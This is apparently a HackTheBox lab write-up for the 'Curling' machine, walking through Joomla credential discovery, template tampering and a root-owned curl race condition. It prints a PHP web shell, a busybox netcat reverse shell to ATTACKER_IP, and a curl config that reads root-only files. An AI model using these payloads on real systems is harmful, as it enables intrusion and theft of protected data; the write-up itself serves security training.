## Welcome everyone!

Today, we will explore **Curling**, a machine from HackTheBox.

Without further ado, let’s get started!

![image](/HTB/Curling/Curling_images/1.png)

(Please ensure that you have added the following line   `curling.htb     TARGET_IP`   to your local `/etc/hosts` file to enable **DNS resolution**)

## Information Gathering

First, we will perform an aggressive Nmap scan to gather as much information as possible about the target:

![image](/HTB/Curling/Curling_images/2.png)

There are two exposed services:

- SSH (Port 22)
- HTTP (Port 80)

The web application running on port 80 appears to be powered by **Joomla!**.

We can start by inspecting its content:

![image](/HTB/Curling/Curling_images/3.png)

The root page contains several pieces of information. We can observe multiple posts written by the mysterious “**Super User**” user. We can also log in using the authentication form on the right side of the page After inspecting the **source code** of the page, we can identify an intriguing **HTML comment**:

![image](/HTB/Curling/Curling_images/4.png)

This HTML comment strongly suggests that a `secret.txt` file is accessible, in one way or another.

We could attempt to access this file from our web browser if directory listing is allowed:

![image](/HTB/Curling/Curling_images/5.png)

We successfully accessed the hidden file. The text appears to be encoded in Base64. We can use CyberChef to decode it:

![image](/HTB/Curling/Curling_images/6.png)

We successfully recovered the plaintext string `Curling2018!`. It strongly appears to be a valid password. However, we didn’t identify any user, except for “Super User” which does not lead anywhere.

Getting back to the root page of the website, we can identify that a post written by the *Super User* is signed by someone named “*Floris*”:

![image](/HTB/Curling/Curling_images/7.png)

We just found a potential username to test our password. Let’s attempt to authenticate using the login panel at the right of the page:

![image](/HTB/Curling/Curling_images/8.png)

 

It works! We successfully authenticated to the **Joomla!** CMS. But unfortunately, we don’t have access to any dashboard. We can use Gobuster to enumerate interesting web endpoints while authenticated as a privileged user:

![image](/HTB/Curling/Curling_images/9.png)

We can identify a valid `/administrator` endpoint accessible without authentication. Accessing it redirects us to another login panel. Providing the same credentials allows us to access the web application’s dashboard:

![image](/HTB/Curling/Curling_images/10.png)

![image](/HTB/Curling/Curling_images/11.png)

## Initial Access

We can now edit the source code of the available web resources, a dangerous attack vector from a security perspective because it could allow us to tamper with the web’s source code or with web resources, leading to **remote code execution** (RCE).

A common technique consists of tampering with the **web templates**, such as `index.php` (the root page) or `error.php`. Since these web resources are written in **PHP** code, we could abuse it to create a malicious URL parameter directly in the tarteted web resource. For example, the following code would allow an attacker to execute system commands through the PHP code executed by the remote server:

`<?php
if (isset($_GET['cmd'])) {
system ($_GET['cmd']);
}
?>`

This code allows the “`cmd`” GET URL parameter to execute system commands from the attacker’s web browser through the following URL:

`http://TARGET/index.php?cmd=SYSTEM_CMD`.

To demonstrate it, we will attempt to access the `index.php` code from the dashboard. At the right of the page, in the *Configuration* section, click on the *Templates* button. Then, click on *Templates* again as shown below:

![image](/HTB/Curling/Curling_images/12.png)

Then, we will select the second template as it is the template currently used by the website.

![image](/HTB/Curling/Curling_images/13.png)

We are now able to edit the web resources code. Selecting `index.php` allows us to edit directly the web root page code. An attacker could deface a site at this stage of the exploitation, but here, we will aim to reach our initial foothold on the target machine. Our goal is to execute system commands remotely, so we will use the web shell PHP code shown earlier. Without erasing any piece of code, just add the code without the PHP tags at the top and the bottom as shown below:

![image](/HTB/Curling/Curling_images/14.png)

 

Our code is now embedded in the root page of the website. But because we are authenticated, accessing the `/index.php` endpoint from our web browser will redirect us to the Joomla! dashboard. Consequently, we need to exit the source code edition section and click on the *Logout* button at the very top right of the screen. 

![image](/HTB/Curling/Curling_images/15.png)

Afterwards, we could access the root page providing the `?cmd=` URL parameter preceding the system command we want to execute:

![image](/HTB/Curling/Curling_images/16.png)

We successfully achieved remote code execution from the target website. Because the w`ww-data` user is not allowed to execute any Bash payload to initiate a reverse shell, we can use the following `busybox` command to initiate a connection to a listener we will set up:

`busybox nc ATTACKER_IP NC_PORT -e sh`

(ensure that you have set up a Netcat listener through `nc -lvnp PORT` to catch the incoming connection)

![image](/HTB/Curling/Curling_images/17.png)

The request should hang in your browser and you should obtain an initial access on the machine as the **www-data** user.

Since the current shell has no TTY and job control, it can be upgraded using the following commands:

`python3 -c 'import pty; pty.spawn("/bin/bash")'`

`export TERM=xterm`

## Privilege Escalation

One of the first things we want to do once we gain access to a system is to enumerate the available users to see whether their system resources are well-protected or not. If not, it could lead to a **privilege escalation** resulting a big issue from a security perspective:

![image](/HTB/Curling/Curling_images/18.png)

We can identify a non-root user: **floris**. This user sounds familiar to us, we even have a password associated associated with him. Because we can’t read the `user.txt` file in his `/home/floris` directory, let’s attempt to authenticate ourselves again with the password we found earlier over SSH in case the password has been reused:

![image](/HTB/Curling/Curling_images/19.png)

Unfortunately, the password has not been reused for SSH. As i mentioned earlier, we can’t read the `user.txt` file in the `/home/floris` directory. However, we can access it and list its content. Moreover, we can identify an intriguing `password_backup` file:

![image](/HTB/Curling/Curling_images/20.png)

The file contains **hexadecimal** **strings** that appear to represent a file. Pasting it into CyberChef, we are suggested to apply **Bzip** and **Gunzip** decompression before extracting the archive. This allows us to reconstruct a `password.txt` file. Opening it reveals the following password:

![image](/HTB/Curling/Curling_images/21.png)

We successfully recovered the plaintext password associated with the system user floris: 

`5d<wdCbdZu)|hChXll`

Since the only other exposed service is SSH, we can authenticate ourselves over this protocol to stabilize our shell session:

![image](/HTB/Curling/Curling_images/22.png)


We successfully gained access to the **floris** user, allowing us to retrieve the first flag:

![image](/HTB/Curling/Curling_images/23.png)



## Post-Exploitation

We now need to find a way to retrieve the final flag located in the restricted `/root` directory.

A basic local enumeration with Living-Off-The-Land tools wasn’t enough to find the breach. I used **pspy64** to perform live monitoring of the system’s scheduled jobs and tasks. After transferring it through a Python server on the attacker machine, I gave it execute permissions and launched it to monitor what could be happening in the background:

![image](/HTB/Curling/Curling_images/24.png)

![image](/HTB/Curling/Curling_images/25.png)

We can observe that the system periodically executes a curl command under a process **root-owned**, using an `input` configuration file located in our `admin-area` directory. Listing its permissions reveals that this file is writable by us, which means that we can control what the `curl` command will fetch:

![image](/HTB/Curling/Curling_images/26.png)

It appears that the loopback address of the target machine is provided to `curl`. One thing to know about the *url* value is that it can point to **local system resources** through the use of `file:///` instead of `http://`. Since the command is executed locally on the system, it will directly fetch the file provided. Moreover, `curl` can also process the *output directive* as well. If you don’t see where we’re going, think about the fact that this command is owned by a **root process**.

Indeed, this means that no restriction will prevent the `curl` command to output the referenced system resources. Consequently, we could replace the `input` file by the following content:

`url = "file:///root/root.txt"`

`output = "/home/floris/root_flag_owned.txt"`

After saving the file, we just have to wait the task to be executed in order for our malicious configuration file to be processed. Unfortunately, our configuration file gets overwritten by the `/root/default.txt` content (representing the HTTP loopback address) almost instantly. Yes, almost. Because there is a piece of code very interesting before the configuration file is overwritten: `/bin/sh -c sleep 1`.

This command introduces a one-second delay between the moment the configuration file is parsed by `curl` and the file get overwritten. This creates a race condition between the moment our malicious configuration is written, the moment curl reads it as root, and the moment the original configuration overwrites it. One technique consists of repeatedly executing the following code writing command < every second in order to be sure that the file instruction will be treated before the overwriting of our malicious file. We could then use this command continuously by using the UP arrow key + Enter:

`echo 'url = "file:///root/root.txt"' > input && echo 'output = "/home/floris/root_flag_owned.txt"' >> input`

![image](/HTB/Curling/Curling_images/27.png)

![image](/HTB/Curling/Curling_images/28.png)


After repeatedly overwriting the input file, our malicious configuration is eventually processed by the **root-owned** `curl` command. The requested file is then written to a location controlled by floris, allowing us to read otherwise restricted resources such as `/etc/shadow` or the root flag.

![image](/HTB/Curling/Curling_images/29.png)


Challenge completed!

![image](/HTB/Curling/Curling_images/30.png)




# Conclusion

This box was interesting to complete. We started from a basic website enumeration of port 80 that lead to a hidden `secret.txt` accessible from our web browser. This file contained the password of the user Floris encoded in Base64, which allowed us to authenticate to the Joomla! administrative dashboard. From this point, we tampered with the PHP code of the index.php page in order to write a web shell directly embedded in the web page. This allowed to execute system commands as the user **www-data** and obtain an initial access on the machine. Then, we decoded the hexadecimal data and extracted the resulting archive of a password_backup file containing the SSH password for the user floris, allowing us to escalate our privileges. This misconfiguration ultimately gave us an arbitrary file-read primitive on sensitive system resources that a non-root user should not have access. This vulnerability ultimately demonstrated how multiple low-severity vulnerabilities can be chained to achieve a higher level of compromise. We started from nothing but an IP address to a critical system compromise resulted from a misconfiguration allowing any resources to be accessed on the system such as root-owned files at this stage of privilege. 

**Thank you for reading!**
